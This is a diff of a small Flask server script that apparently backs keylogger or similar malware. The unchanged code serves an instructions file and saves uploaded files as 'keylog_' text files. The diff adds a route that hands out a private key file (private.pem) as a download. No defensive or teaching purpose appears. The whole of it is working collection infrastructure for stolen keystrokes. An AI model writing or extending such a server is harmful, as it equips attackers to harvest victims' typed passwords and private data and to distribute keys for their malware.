@@ -4,7 +4,7 @@
 
 # pip install Flask==2.0.1 Jinja2==3.0.1 --force-reinstall
 # pip install --upgrade Flask Werkzeug
-from flask import Flask, send_from_directory, request
+from flask import Flask, send_from_directory, request, send_file
 from time import time
 
 ###########################################################################################################################
@@ -14,6 +14,7 @@ from time import time
 IP_ADDRESS = "10.0.2.15"
 PORT = 8000
 FILE_TO_SERVE = "./instructions.txt"
+SECRET_KEY = "./private.pem"
 
 ###########################################################################################################################
 #####################################################     PROGRAM     #####################################################
@@ -38,13 +39,14 @@ if __name__ == '__main__':
     def upload_file():
         if 'file' not in request.files:
             return 'No file provided in the request'
-
         file = request.files['file']
-
         # Save the uploaded file to the server's folder
         file.save(f'./keylog_{int(time())}.txt')
-
         return 'File uploaded successfully'
+
+    @app.route('/send_secret_key')
+    def send_secret_key():
+        return send_file(SECRET_KEY, as_attachment=True)
 
     if __name__ == '__main__':
         app.run(host=IP_ADDRESS, port=PORT, debug=True)
